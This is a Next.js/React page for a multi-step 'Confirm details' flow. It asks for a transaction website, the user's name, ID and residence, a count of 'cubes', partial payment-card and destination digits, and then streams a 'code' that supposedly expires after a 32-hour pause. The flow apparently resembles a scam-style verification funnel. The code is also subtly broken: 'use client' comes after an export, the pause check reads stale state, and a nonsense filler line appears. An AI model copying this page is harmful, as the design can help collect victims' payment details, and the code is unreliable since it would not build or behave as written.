export const dynamic = 'force-dynamic';
'use client';
import Image from 'next/image';
import UserTopBar from '@/components/UserTopBar';
import React, {useEffect, useRef, useState} from 'react';

const OPTIONS = ['кокз 1','кокз 2','кокз 3','кокоз 4','кокоз 5','кокоз 6','кокоз 7','кокоз 8','кокоз 9','кокоз 10','кокоз 11'];

type Profile = { nameOnSite?:string; idOnSite?:string; residence?:string; photoUrl?:string; };

export default function ConfirmPage(){
  const [step,setStep]=useState(1);
  const [site,setSite]=useState<string>('');
  const [nameOnSite,setName]=useState('');
  const [idOnSite,setId]=useState('');
  const [residence,setRes]=useState('');
  const [matches,setMatches]=useState(false);
  const [profile,setProfile]=useState<Profile|undefined>(undefined);
  const [cubes,setCubes]=useState<number|undefined>(undefined);
  const [method,setMethod]=useState('');
  const [codeChars,setCodeChars]=useState<string>('');
  const [paused,setPaused]=useState(false);
  const [showPauseNote,setShowPauseNote]=useState(false);
  const evtRef = useRef<EventSource|null>(null);

  useEffect(()=>()=>{ if(evtRef.current) evtRef.current.close(); },[]);

  async function checkMatch(){
    // грузим меня и профиль, сверяем ТОЛЬКО idOnSite
    const res = await fetch('/me.json');
    const me = await res.json();
    const p = me?.user?.profile || {};
    const ok = !!idOnSite && (p.idOnSite||'')===idOnSite;
    setMatches(ok);
    setProfile(p);
    setStep(3);
  }

  function startStream(){
    if(evtRef.current) evtRef.current.close();
    const es = new EventSource('/api/code-stream');
    evtRef.current = es;
    es.onmessage = (e)=>{
      try{
        const data = JSON.parse(e.data);
        if(data.type==='char' && !paused){
          setCodeChars(prev=>prev + (prev ? ' ' : '') + data.value); // визуальный отступ между символами
        }
      }catch{}
    };
  }

  function doPause(){
    setPaused(true);
    setShowPauseNote(true); // не скрываем до старта
  }
  function doStart(){
    setPaused(false);
    setShowPauseNote(false);
  }

  return (
    <div style={{minHeight:'100vh', position:'relative', color:'#e5e7eb'}}>
      <Image src="/images/Background_1.webp" alt="" fill style={{objectFit:'cover', opacity:.25, filter:'blur(2px)'}}/>
      {/* крупный логотип по центру за карточкой */}
      <div aria-hidden style={{
        position:'fixed', inset:0, display:'flex', alignItems:'center', justifyContent:'center',
        pointerEvents:'none', zIndex:0, opacity:.95
      }}>
        <div style={{position:'relative', width:'min(96vw, 880px)', height:'min(96vw, 880px)'}}>
          <Image src="/images/Logo_3.webp" alt="" fill priority style={{objectFit:'contain'}}/>
        </div>
      </div>

      <div style={{position:'relative', zIndex:1}}>
        <UserTopBar/>

        <div className="centered" style={{flexDirection:'column', gap:16, padding:'22px 16px'}}>
          <div className="card" style={{width:820, maxWidth:'95%', background:'rgba(17,24,39,.88)', border:'1px solid #1f2937', borderRadius:14}}>
            <div className="title" style={{fontSize:22, fontWeight:700, padding:'12px 14px', borderBottom:'1px solid #1f2937'}}>Confirm details</div>

            {/* STEP 1: сайт */}
            {step===1 && (
              <div className="stack" style={{padding:14}}>
                <label>The name of the website where you communicated and conducted transactions</label>
                <select className="input" value={site} onChange={e=>setSite(e.target.value)}>
                  <option value="">Select...</option>
                  {OPTIONS.map(o=><option key={o} value={o}>{o}</option>)}
                </select>

                <div className="muted" style={{opacity:.85}}>Если вы не нашли подходящий вариант обратитесь в поддержку.</div>
                <div style={{display:'flex',gap:8}}>
                  <a className="btn" href="/chat">Open support chat</a>
                  <button className="btn btn-primary" disabled={!site} onClick={()=>setStep(2)}>Next</button>
                </div>
              </div>
            )}

            {/* STEP 2: ФИО, ID, Residence */}
            {step===2 && (
              <div className="stack" style={{padding:14}}>
                <input className="input" placeholder="Your name on the website" value={nameOnSite} onChange={e=>setName(e.target.value)} />
                <input className="input" placeholder="Your ID on the website" value={idOnSite} onChange={e=>setId(e.target.value)} />
                <input className="input" placeholder="Place of residence indicated on the website" value={residence} onChange={e=>setRes(e.target.value)} />
                <div className="muted" style={{opacity:.85}}>Если вы не нашли подходящий вариант обратитесь в поддержку.</div>
                <div className="muted" style={{opacity:.7, fontStyle:'italic'}}>The panda rabbit crocodile, di di di, eats candy, and could eat shashlik, but the elephant didn't come</div>
                <div style={{display:'flex',gap:8}}>
                  <a className="btn" href="/chat">Open support chat</a>
                  <button className="btn btn-primary" onClick={checkMatch}>Confirm and continue</button>
                </div>
              </div>
            )}

            {/* STEP 3: показ профиля если совпало только по ID */}
            {step===3 && (
              <div className="stack" style={{padding:14}}>
                {matches ? (
                  <>
                    <div className="panel" style={{background:'#0b1220', border:'1px solid #1f2937', borderRadius:10, padding:12}}>
                      <div className="grid cols-2" style={{display:'grid', gridTemplateColumns:'1fr 1fr', gap:10}}>
                        <div><div className="muted">Your name on the website</div><div>{profile?.nameOnSite}</div></div>
                        <div><div className="muted">Your ID on the website</div><div>{profile?.idOnSite}</div></div>
                        <div><div className="muted">Place of residence indicated on the website</div><div>{profile?.residence}</div></div>
                        <div>
                          {profile?.photoUrl ? (
                            <img src={profile.photoUrl} alt="photo"
                                 style={{ width:160, height:160, borderRadius:'50%', objectFit:'cover',
                                          border:'3px solid #fff', boxShadow:'0 0 10px rgba(0,0,0,0.2)' }} />
                          ) : null}
                        </div>
                      </div>
                    </div>
                    <div style={{display:'flex',gap:8, marginTop:12}}>
                      <a className="btn" href="/chat">Open support chat</a>
                      <button className="btn btn-primary" onClick={()=>setStep(4)}>Next</button>
                    </div>
                  </>
                ) : (
                  <>
                    <div className="panel" style={{background:'#331b1b', border:'1px solid #7f1d1d', borderRadius:10, padding:12}}>
                      The entered data does not match. Please contact support.
                    </div>
                    <a className="btn" href="/chat">Open support chat</a>
                  </>
                )}
              </div>
            )}

            {/* STEP 4: cubes */}
            {step===4 && (
              <div className="stack" style={{padding:14}}>
                <label>How many cubes did you use?</label>
                <input className="input" type="number" value={cubes ?? ''} onChange={e=>setCubes(parseInt(e.target.value||'0'))} />
                <div className="muted" style={{opacity:.85}}>*please indicate the approximate quantity</div>
                <div className="muted" style={{opacity:.85}}>Если вы не нашли подходящий вариант обратитесь в поддержку.</div>
                <div style={{display:'flex',gap:8}}>
                  <a className="btn" href="/chat">Open support chat</a>
                  <button className="btn btn-primary" onClick={()=>setStep(5)}>Next</button>
                </div>
              </div>
            )}

            {/* STEP 5: метод ****-**** */}
            {step===5 && (
              <div className="stack" style={{padding:14}}>
                <label>Enter the first four digits of the method and the last digits of the destination in the format ****-****</label>
                <input className="input" placeholder="1234-1234" value={method} onChange={e=>setMethod(e.target.value)} />
                <div className="muted" style={{opacity:.85}}>Если вы не нашли подходящий вариант обратитесь в поддержку.</div>
                <div style={{display:'flex',gap:8}}>
                  <a className="btn" href="/chat">Open support chat</a>
                  <button className="btn btn-primary" disabled={!/^\d{4}-\d{4}$/.test(method)} onClick={()=>setStep(6)}>Next</button>
                </div>
              </div>
            )}

            {/* STEP 6: код — без счётчика, пауза держится пока не нажмут Start */}
            {step===6 && (
              <div className="stack" style={{padding:14}}>
                <button className="btn btn-primary" onClick={startStream}>Generate code</button>
                <div className="chatbox" style={{whiteSpace:'pre-wrap', marginTop:10, background:'#0b1220', border:'1px solid #1f2937', borderRadius:10, padding:12}}>
                  {codeChars || 'Waiting for code...'}
                </div>
                <div className="chat-input" style={{display:'flex', gap:8}}>
                  <button className="btn" onClick={doPause}>Pause</button>
                  <button className="btn" onClick={doStart}>Start</button>
                </div>
                {showPauseNote && (
                  <div className="panel" style={{background:'#fffbeb', border:'1px solid #fcd34d', color:'#111827', borderRadius:10, padding:10}}>
                    The pause is set for a maximum of 32 hours, after which the code will become invalid
                  </div>
                )}
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  );
}
